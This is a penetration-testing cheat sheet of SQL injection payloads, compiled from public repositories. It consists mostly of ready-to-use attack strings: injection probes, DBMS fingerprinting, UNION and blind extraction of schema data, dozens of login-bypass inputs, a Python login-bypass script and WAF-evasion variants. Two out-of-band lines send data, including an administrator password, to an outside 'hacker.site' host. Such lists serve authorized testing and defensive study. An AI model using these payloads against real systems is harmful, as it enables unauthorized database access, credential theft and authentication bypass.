---
title: SQLi Payloads 🦊
tags:
  - Payloads
  - SQLi
---
>Content extracted from [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) and [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection)

## Entry Point

```sql
 [Nothing]
'
%27
"
%22
`
')
")
`)
'))
"))
`))
#
%23
;
%3B
)
Wildcard (*)
&apos;  # required for XML content
%%2727
%25%27
```

## Comments

```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```

## Confirming with logical operations

```sql
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```

> Check [SQLi Logic 👅](sqli_logic.md) wordlist

## Confirming with Timing

```sql
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## Identifying Back-end (DBMS Identification)

```sql
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

## Identifying Back-end (DBMS Identification) VIA Error

|DBMS|Example Error Message|Example Payload|
|---|---|---|
|MySQL|`You have an error in your SQL syntax; ... near '' at line 1`|`'`|
|PostgreSQL|`ERROR: unterminated quoted string at or near "'"`|`'`|
|PostgreSQL|`ERROR: syntax error at or near "1"`|`1'`|
|Microsoft SQL Server|`Unclosed quotation mark after the character string ''.`|`'`|
|Microsoft SQL Server|`Incorrect syntax near ''.`|`'`|
|Microsoft SQL Server|`The conversion of the varchar value to data type int resulted in an out-of-range value.`|`1'`|
|Oracle|`ORA-00933: SQL command not properly ended`|`'`|
|Oracle|`ORA-01756: quoted string not properly terminated`|`'`|
|Oracle|`ORA-00923: FROM keyword not found where expected`|`1'`|

## Exploiting Union Based

### Detecting the number of columns

#### Order/Group by

```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```

#### UNION SELECT

```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

### Extract  database name, table names and column names

```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```

## Exploiting Hidden Union Based

> Check [https://infosecwriteups.com/healing-blind-injections-df30b9e0e06f](https://infosecwriteups.com/healing-blind-injections-df30b9e0e06f)

## Exploiting Error Based

```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```

## Exploiting Blind SQLi

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```

## Exploiting Error Blind SQLi

```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```

## Exploiting Time Based SQLi

```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```

## Out of band Exploitation

```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```

### Out of band exfiltration via XXE

```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```

## Authentication bypass

```shell
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

### Raw hash authentication Bypass

```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```

This query showcases a vulnerability when MD5 is used with true for raw output in authentication checks, making the system susceptible to SQL injection. Attackers can exploit this by crafting inputs that, when hashed, produce unexpected SQL command parts, leading to unauthorized access.

```sql
md5("ffifdyop", true) = 'or'6�]��!r,��b�
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
```

### Injected hash authentication Bypass

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

> Check [SQLi hashbypass 🎳](sqli_hashbypass.md) wordlist

### GBK Authentication Bypass

```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```

Python script:

```python
import requests
url = "http://example.com/index.php" 
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3') 
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"} 
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) 
print r.text
```

### Polyglot Injection (multicontext)

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## WAF bypass

### No spaces bypass

No Space (%20) - bypass using whitespace alternatives:

```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

No Whitespace - bypass using comments

```sql
?id=1/*comment*/and/**/1=1/**/--
```

No Whitespace - bypass using parenthesis

```sql
?id=(1)and(1)=(1)--
```

### No commas bypass

No Comma - bypass using OFFSET, FROM and JOIN

```sql
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

### Generic Bypasses

Blacklist using keywords - bypass using uppercase/lowercase

```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

Blacklist using keywords case insensitive - bypass using an equivalent operator

```sql
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```

### Scientific Notation WAF bypass

Read more in [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)

```sql
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```

